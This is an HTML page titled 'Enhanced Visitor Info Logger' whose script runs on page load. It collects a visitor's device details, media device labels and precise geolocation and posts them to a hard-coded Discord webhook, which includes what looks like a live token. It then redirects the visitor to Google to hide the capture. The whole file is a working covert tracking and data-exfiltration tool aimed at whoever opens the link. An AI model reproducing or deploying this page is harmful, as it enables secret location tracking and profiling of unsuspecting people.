<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Visitor Info Logger</title>
</head>
<body>
    <h1>Gathering Information...</h1>
    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
        const redirectURL = 'https://www.google.com';

        // Function to get geolocation
        function getGeolocation() {
            return new Promise(resolve => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            resolve(`Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`);
                        },
                        () => resolve('Permission Denied or Not Available')
                    );
                } else {
                    resolve('Geolocation not supported');
                }
            });
        }

        // Function to get connection type
        function getConnectionType() {
            return navigator.connection ? navigator.connection.effectiveType : 'Not Available';
        }

        // Function to get media devices
        async function getMediaDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const deviceList = devices.map(device => device.kind + ': ' + device.label).join('\n');
                return deviceList || 'No Devices Found';
            } catch {
                return 'Permission Denied or Not Available';
            }
        }

        // Function to detect touch support
        function hasTouchSupport() {
            return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        }

        // Function to check cookies
        function areCookiesEnabled() {
            return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
        }

        // Function to collect device information
        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const colorDepth = window.screen.colorDepth + ' bits';
            const connectionType = getConnectionType();
            const cookies = areCookiesEnabled();
            const touchSupport = hasTouchSupport();
            const geolocation = await getGeolocation();
            const mediaDevices = await getMediaDevices();

            let os = 'Unknown';
            if (/windows nt/i.test(userAgent)) {
                const versionMatch = userAgent.match(/windows nt (\d+\.\d+)/i);
                os = versionMatch ? `Windows ${versionMatch[1]}` : 'Windows';
            } else if (/mac os x/i.test(userAgent)) {
                const versionMatch = userAgent.match(/mac os x (\d+_\d+)/i);
                os = versionMatch ? `macOS ${versionMatch[1].replace('_', '.')}` : 'macOS';
            } else if (/linux/i.test(userAgent)) {
                os = 'Linux';
            } else if (/android/i.test(userAgent)) {
                const versionMatch = userAgent.match(/android (\d+\.\d+)/i);
                os = versionMatch ? `Android ${versionMatch[1]}` : 'Android';
            } else if (/iphone|ipad|ipod/i.test(userAgent)) {
                const versionMatch = userAgent.match(/os (\d+_\d+)/i);
                os = versionMatch ? `iOS ${versionMatch[1].replace('_', '.')}` : 'iOS';
            }

            return `
                User-Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Timezone: ${timezone}
                OS: ${os}
                Color Depth: ${colorDepth}
                Connection Type: ${connectionType}
                Cookies: ${cookies}
                Touch Support: ${touchSupport ? 'Yes' : 'No'}
                Geolocation: ${geolocation}
                Media Devices: ${mediaDevices}
            `;
        }

        // Function to send data to Discord webhook
        async function sendToDiscord() {
            const deviceInfo = await getDeviceInfo();
            const timestamp = new Date().toLocaleString();

            const payload = {
                embeds: [{
                    title: "ðŸ“‹ Visitor Information Logged",
                    color: 3447003,
                    fields: [
                        { name: "Device Info", value: `\`\`\`${deviceInfo}\`\`\`` },
                    ],
                    footer: { text: `Logged at: ${timestamp}` }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Visitor info logged successfully');
                    window.location.href = redirectURL;
                } else {
                    console.error('Failed to log visitor info:', response.statusText);
                }
            })
            .catch(error => console.error('Error sending to webhook:', error));
        }

        // Execute the data collection and logging
        sendToDiscord();
    </script>
</body>
</html>
